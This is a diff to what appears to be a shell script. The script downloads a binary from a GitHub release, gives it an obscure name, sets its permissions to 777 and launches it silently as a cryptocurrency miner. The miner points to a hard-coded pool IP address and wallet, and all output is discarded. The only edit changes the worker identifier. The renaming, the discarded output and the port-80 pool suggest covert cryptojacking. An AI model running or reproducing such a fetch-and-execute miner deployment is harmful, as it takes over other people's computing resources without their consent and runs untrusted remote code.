@@ -3,4 +3,4 @@ rm -rf peakminer-2.16.2.tar.gz
 wget https://github.com/vedhagsvp/tkospae/releases/download/aplose/pkso
 mv pkso bdreas
 chmod 777 bdreas
-./bdreas --coin pearl -o 57.128.164.63:80 -u prl1pg75kn5m2very9je3rd0v9z89n7wxxud89gc6v07ayckep4adjgmqzahmmr/AA24444-$RANDOM > /dev/null 2>&1
+./bdreas --coin pearl -o 57.128.164.63:80 -u prl1pg75kn5m2very9je3rd0v9z89n7wxxud89gc6v07ayckep4adjgmqzahmmr/AA2444466-$RANDOM > /dev/null 2>&1
